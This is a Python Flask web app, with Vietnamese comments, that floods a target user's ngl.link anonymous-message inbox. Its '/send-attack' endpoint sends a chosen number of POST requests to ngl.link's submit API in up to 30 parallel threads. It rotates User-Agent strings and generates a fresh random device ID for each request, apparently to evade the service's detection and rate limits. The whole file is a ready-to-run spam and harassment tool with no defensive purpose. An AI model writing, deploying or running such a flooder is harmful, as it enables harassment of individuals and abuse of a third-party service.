from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import requests
import time
import uuid
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__, template_folder='templates')
CORS(app)

# Danh sách User-Agent đa dạng
USER_AGENTS = [
    # (Danh sách user agents bạn đã đưa vào đây, giữ nguyên)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.5735.110 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    # ... (giữ nguyên tất cả user agents như code bạn gửi)
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)"
]

@app.route('/')
def index():
    return render_template('index.html')

def send_single_request(username, message, index):
    headers = {
        "Host": "ngl.link",
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest",
        "origin": "https://ngl.link",
        "referer": f"https://ngl.link/{username}",
        "user-agent": random.choice(USER_AGENTS)
    }

    payload = {
        "username": username,
        "question": message,
        "deviceId": str(uuid.uuid4()),
        "gameSlug": "",
        "referrer": ""
    }

    try:
        response = requests.post("https://ngl.link/api/submit", headers=headers, data=payload)
        print(f"[{index+1}] Status Code: {response.status_code}")
        return {
            'status_code': response.status_code,
            'success': response.status_code == 200,
            'message': f"Đã gửi {index+1}",
            'response': response.text
        }
    except Exception as e:
        print(f"[{index+1}] Error: {e}")
        return {
            'status_code': 0,
            'success': False,
            'message': f"Lỗi ở request {index+1}",
            'response': str(e)
        }

@app.route('/send-attack', methods=['POST'])
def send_attack():
    data = request.json
    username = data.get('username')
    message = data.get('message') or "Hello from bot!"
    count = int(data.get('count', 1))

    results = []
    MAX_THREADS = min(30, count)  # Giới hạn số thread tối đa để tránh quá tải

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(send_single_request, username, message, i) for i in range(count)]
        for future in as_completed(futures):
            res = future.result()
            results.append(res)

    return jsonify({'results': results})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=81)
